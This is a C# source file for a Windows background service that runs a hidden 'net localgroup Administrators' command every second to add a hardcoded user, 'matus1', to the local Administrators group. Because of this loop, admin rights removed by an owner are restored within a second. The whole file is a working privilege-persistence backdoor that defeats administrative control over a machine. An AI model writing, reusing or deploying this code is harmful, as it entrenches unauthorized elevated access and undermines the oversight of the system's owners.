using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;

namespace GrantAdminPrivilegesService
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;

        public Worker(ILogger<Worker> logger)
        {
            _logger = logger;
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                _logger.LogInformation("Worker running at: {time}", DateTimeOffset.Now);
                try
                {
                    GrantAdminPrivileges("matus1");
                }
                catch (Exception ex)
                {
                    _logger.LogError(ex, "Failed to grant admin privileges");
                }
                await Task.Delay(1000, stoppingToken); // Delay to prevent continuous execution
            }
        }

        private void GrantAdminPrivileges(string username)
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = "net",
                Arguments = $"localgroup Administrators {username} /add",
                UseShellExecute = false,
                CreateNoWindow = true,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            using (var process = new Process { StartInfo = startInfo })
            {
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    throw new InvalidOperationException($"Failed to grant admin privileges: {error}");
                }
            }
        }
    }
}
